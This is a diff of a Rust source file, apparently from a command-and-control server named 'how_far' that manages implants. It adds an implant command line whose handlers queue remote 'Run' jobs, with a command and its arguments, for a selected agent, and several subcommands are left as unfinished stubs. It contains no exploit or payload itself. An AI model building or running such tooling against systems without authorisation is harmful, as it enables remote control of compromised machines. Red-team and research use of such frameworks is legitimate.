@@ -1,21 +1,27 @@
 mod data;
 mod implant;
 
+use chrono::Utc;
 use clap::{Parser, Subcommand};
+use how_far_types::{ImplantJob, ImplantJobInner};
+use log::{error, info};
 use std::collections::HashMap;
 use std::str::SplitWhitespace;
 
 use crate::color_level;
+use crate::database::IMPLANT_DB;
+
+use self::implant::ImplantCommands;
 
 /// Interactive server for managing implants
-#[derive(Parser, Debug)]
+#[derive(Parser)]
 #[command(version, about = None, long_about = None)]
 pub struct Cli {
     #[command(subcommand)]
     command: Commands,
 }
 
-#[derive(Subcommand, Debug)]
+#[derive(Subcommand)]
 enum Commands {
     /// Commands for manipulating the database; Alias: db
     #[command(alias = "db")]
@@ -29,7 +35,7 @@ enum Commands {
     Use { id: u32 },
 }
 
-#[derive(Subcommand, Debug)]
+#[derive(Subcommand)]
 enum DatabaseCommands {
     /// Lists the entries in the database
     List,
@@ -41,16 +47,71 @@ enum DatabaseCommands {
     Remove { id: u32 },
 }
 
+/// CLI designed for handling implant commands
+#[derive(Parser)]
+#[command(version, about = None, long_about = None)]
+pub struct ImplantCli {
+    #[command(subcommand)]
+    command: ImplantCommands,
+}
+
 pub async fn parse_cmd(str: String) -> Result<Cli, clap::Error> {
     let str = format!("{} {}", env!("CARGO_PKG_NAME"), str);
     Cli::try_parse_from(str.split_whitespace())
 }
+
+pub async fn parse_implant_cmd(str: String) -> Result<ImplantCli, clap::Error> {
+    let str = format!("{} {}", env!("CARGO_PKG_NAME"), str);
+    ImplantCli::try_parse_from(str.split_whitespace())
+}
+
 
 pub async fn handle_cmd(cli: &Cli) {
     match &cli.command {
         Commands::Database { command } => data::handle_database_cmds(command).await,
         Commands::Use { id } => implant::select_agent(*id).await,
     }
+}
+
+pub async fn handle_implant_cmd(cli: &ImplantCli) {
+    let result = match &cli.command {
+        ImplantCommands::Jobs => todo!(),
+        ImplantCommands::Run { cmd, args } => handle_job_cmd(cmd.to_owned(), args.to_owned()).await,
+        ImplantCommands::Cancel { job: _ } => todo!(),
+        ImplantCommands::Sleep { secs: _ } => todo!(),
+        ImplantCommands::Exit => {
+            // removes selected agent, cancelling it
+            crate::SELECTED_AGENT.lock().unwrap().take();
+            return ;
+        },
+    };
+
+    match result {
+        Ok(_) => info!("{} Successfully added job to queue", color_level(log::Level::Info)),
+        Err(e) => error!("{} {}", color_level(log::Level::Error), e),
+    }
+}
+
+pub async fn handle_job_cmd(cmd: String, args: Vec<String>) -> Result<(), anyhow::Error> {
+    let cmd = match how_far_types::JobCommand::parse_cmd(cmd) {
+        Ok(v) => v,
+        Err(e) => return Err(e.into()),
+    };
+
+    add_run_job(cmd.to_string(), args).await
+}
+
+pub async fn add_run_job(cmd: String, args: Vec<String>) -> Result<(), anyhow::Error> {
+    let id = crate::SELECTED_AGENT.lock().unwrap().clone().unwrap().0;
+    let job = ImplantJob {
+        issue_time: Utc::now(),
+        job: ImplantJobInner {
+            request_type: how_far_types::ImplantJobType::Run(cmd),
+            args,
+        },
+    };
+
+    IMPLANT_DB.push_job(id, job).await
 }
 
 /// Returns boolean denoting whether it successfully ran the command
